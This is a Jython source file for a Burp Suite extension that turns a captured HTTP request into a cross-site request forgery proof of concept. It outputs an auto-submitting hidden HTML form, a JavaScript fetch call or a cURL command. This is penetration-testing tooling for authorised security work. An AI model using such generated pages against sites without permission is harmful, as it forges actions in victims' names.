from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem, JDialog, JScrollPane, JTextArea, JButton, JPanel, JFileChooser, JCheckBox, JComboBox
from java.awt import BorderLayout, Dimension
from java.net import URLDecoder
import java.awt.Desktop as Desktop
import java.io.File as File
from java.util import ArrayList
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit

# Optional syntax highlighting
try:
    from org.fife.ui.rsyntaxtextarea import RSyntaxTextArea, SyntaxConstants
    from org.fife.ui.rtextarea import RTextScrollPane
    HAS_SYNTAX = True
except ImportError:
    HAS_SYNTAX = False

class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("CSRF PoC Generator")
        callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        menu = ArrayList()
        menu_item = JMenuItem("Generate CSRF PoC", actionPerformed=lambda x: self.generate_poc(invocation))
        menu.add(menu_item)
        return menu

    def generate_poc(self, invocation):
        try:
            request_info = self._helpers.analyzeRequest(invocation.getSelectedMessages()[0])
            request = invocation.getSelectedMessages()[0].getRequest()
            method = request_info.getMethod()
            url = request_info.getUrl()
            body_offset = request_info.getBodyOffset()
            body = self._helpers.bytesToString(request[body_offset:])
            parsed_url = url
            protocol = parsed_url.getProtocol()
            host = parsed_url.getHost()
            file = parsed_url.getFile()
            port = parsed_url.getPort()

            if (protocol == "http" and port == 80) or (protocol == "https" and port == 443):
                action_url = "{}://{}{}".format(protocol, host, file)
            else:
                action_url = "{}://{}:{}{}".format(protocol, host, port, file)

            form_fields = ""
            if method.upper() == "POST":
                for param in body.split("&"):
                    if "=" in param:
                        k, v = param.split("=", 1)
                        k = URLDecoder.decode(k, "UTF-8")
                        v = URLDecoder.decode(v, "UTF-8")
                        form_fields += '        <input type="hidden" name="{}" value="{}" />\n'.format(k, v)
            elif method.upper() == "GET":
                query = parsed_url.getQuery()
                if query:
                    for param in query.split("&"):
                        if "=" in param:
                            k, v = param.split("=", 1)
                            k = URLDecoder.decode(k, "UTF-8")
                            v = URLDecoder.decode(v, "UTF-8")
                            form_fields += '        <input type="hidden" name="{}" value="{}" />\n'.format(k, v)

            self.method = method
            self.form_fields = form_fields
            self.action_url = action_url

            # Default output
            default_html = self.generate_html_form(True)
            self.show_popup("Generated CSRF PoC", default_html)
        except Exception as e:
            print("[ERROR]", e)

    def generate_html_form(self, auto_submit):
        submit_script = """
    <script>
        document.getElementById('csrfForm').submit();
    </script>""" if auto_submit else ""
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>CSRF PoC</title>
</head>
<body>
    <!-- Content-Type: application/x-www-form-urlencoded -->
    <form id="csrfForm" action="{}" method="{}">
{}        <input type="submit" value="Submit request" />
    </form>{}
</body>
</html>""".format(self.action_url, self.method, self.form_fields, submit_script)

    def generate_fetch_js(self):
        params = []
        for line in self.form_fields.strip().splitlines():
            if 'name="' in line:
                name = line.split('name="')[1].split('"')[0]
                value = line.split('value="')[1].split('"')[0]
                params.append('"{}={}"'.format(name, value))
        body = "&".join(params)
        return """fetch("{}", {{
    method: "{}",
    headers: {{
        "Content-Type": "application/x-www-form-urlencoded"
    }},
    body: {}
}});""".format(self.action_url, self.method, '"{}"'.format(body))

    def generate_curl(self):
        params = []
        for line in self.form_fields.strip().splitlines():
            if 'name="' in line:
                name = line.split('name="')[1].split('"')[0]
                value = line.split('value="')[1].split('"')[0]
                params.append('"{}={}"'.format(name, value))
        data = "&".join(params)
        return "curl -X {} -d \"{}\" \"{}\"".format(self.method.upper(), data, self.action_url)

    def show_popup(self, title, content):
        dialog = JDialog()
        dialog.setTitle(title)
        dialog.setSize(900, 700)
        dialog.setModal(True)
        dialog.setLayout(BorderLayout())

        # Format dropdown
        format_dropdown = JComboBox(["HTML Form", "JavaScript Fetch", "cURL Command"])

        # Output area
        if HAS_SYNTAX:
            text_area = RSyntaxTextArea()
            text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_HTML)
            text_area.setCodeFoldingEnabled(True)
            text_area.setText(content)
            scroll = RTextScrollPane(text_area)
        else:
            text_area = JTextArea(content)
            text_area.setLineWrap(True)
            text_area.setWrapStyleWord(True)
            text_area.setEditable(False)
            scroll = JScrollPane(text_area)

        scroll.setPreferredSize(Dimension(880, 580))
        dialog.add(scroll, BorderLayout.CENTER)

        # Buttons
        button_panel = JPanel()
        auto_submit_checkbox = JCheckBox("Auto-submit form", True)
        save_button = JButton("Save to HTML")
        preview_button = JButton("Preview in Browser")
        copy_button = JButton("Copy to Clipboard")
        close_button = JButton("Close")

        def update_output(event=None):
            fmt = format_dropdown.getSelectedItem()
            if fmt == "HTML Form":
                content = self.generate_html_form(auto_submit_checkbox.isSelected())
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_HTML)
            elif fmt == "JavaScript Fetch":
                content = self.generate_fetch_js()
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_JAVASCRIPT)
            elif fmt == "cURL Command":
                content = self.generate_curl()
                if HAS_SYNTAX:
                    text_area.setSyntaxEditingStyle(SyntaxConstants.SYNTAX_STYLE_NONE)
            text_area.setText(content)

        def save_to_file(event):
            chooser = JFileChooser()
            ret = chooser.showSaveDialog(dialog)
            if ret == JFileChooser.APPROVE_OPTION:
                path = chooser.getSelectedFile().getAbsolutePath()
                with open(path, "w") as f:
                    f.write(text_area.getText())

        def preview_in_browser(event):
            temp_file = File.createTempFile("csrf_poc", ".html")
            temp_file.deleteOnExit()
            with open(temp_file.getAbsolutePath(), "w") as f:
                f.write(text_area.getText())
            Desktop.getDesktop().browse(temp_file.toURI().toURL().toURI())

        def close_dialog(event):
            dialog.dispose()

        def copy_to_clipboard(event):
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(StringSelection(text_area.getText()), None)

        # Event bindings
        auto_submit_checkbox.addActionListener(update_output)
        format_dropdown.addActionListener(update_output)
        save_button.addActionListener(save_to_file)
        preview_button.addActionListener(preview_in_browser)
        close_button.addActionListener(close_dialog)
        copy_button.addActionListener(copy_to_clipboard)

        button_panel.add(format_dropdown)
        button_panel.add(auto_submit_checkbox)
        button_panel.add(copy_button)
        button_panel.add(save_button)
        button_panel.add(preview_button)
        button_panel.add(close_button)
        dialog.add(button_panel, BorderLayout.SOUTH)
        dialog.setLocationRelativeTo(None)
        dialog.setVisible(True)
